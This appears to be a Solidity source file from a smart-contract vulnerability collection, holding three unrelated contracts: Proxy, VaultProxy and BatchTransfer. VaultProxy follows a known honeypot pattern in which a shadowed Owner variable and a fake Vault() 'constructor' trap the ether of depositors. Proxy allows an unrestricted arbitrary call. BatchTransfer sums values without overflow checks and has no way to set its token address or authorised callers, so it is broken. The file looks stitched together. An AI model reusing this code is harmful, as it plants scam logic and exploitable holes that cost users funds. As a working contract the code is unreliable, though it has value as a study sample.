 

pragma solidity ^0.4.23;

contract Proxy  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
    function proxy(address target, bytes data) public payable {
         
        target.call.value(msg.value)(data);
    }
}

contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }
    
    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            deposit();
        }
    }
    
    function deposit() public payable {
        if (msg.value > 0.25 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.transfer(amount);
        }
    }
}
contract ERC20 {
    function balanceOf(address user) public view returns (uint256);
    function allowance(address user, address spender) public view returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool); 
}

contract BatchTransfer {
    address private _erc20_address;
    mapping(address => bool) private _authed_addresses;

    modifier onlyAuthed() {
        require(_authed_addresses[msg.sender], "require auth permission");
        _;
    }

    function transferFrom(address token_holder, address[] token_receivers, uint256[] values) public onlyAuthed returns (bool) {
        require(token_receivers.length == values.length, "token_receiver's size must eq value's size");
        require(token_receivers.length > 0, "token_receiver's length must gt 0");
        
        uint length = token_receivers.length;

        uint i = 0;
        uint value = 0;
        uint total_value = 0;

        for(i = 0; i < length; ++i) {
            value = values[i];
            require(value > 0, "value must gt 0");
            total_value += value;
        }
        
        ERC20 token_contract = ERC20(_erc20_address);
        uint256 holder_balance = token_contract.balanceOf(token_holder);
        require(holder_balance >= total_value, "balance of holder must gte total_value");
        uint256 my_allowance = token_contract.allowance(token_holder, this);
        require(my_allowance >= total_value, "allowance to contract must gte total_value");

        for(i = 0; i < length; ++i) {
            address token_receiver = token_receivers[i];
            value = values[i];
            bool is_success = token_contract.transferFrom(token_holder, token_receiver, value);
            require(is_success, "transaction should be success");
        }

        return true;
    }
}
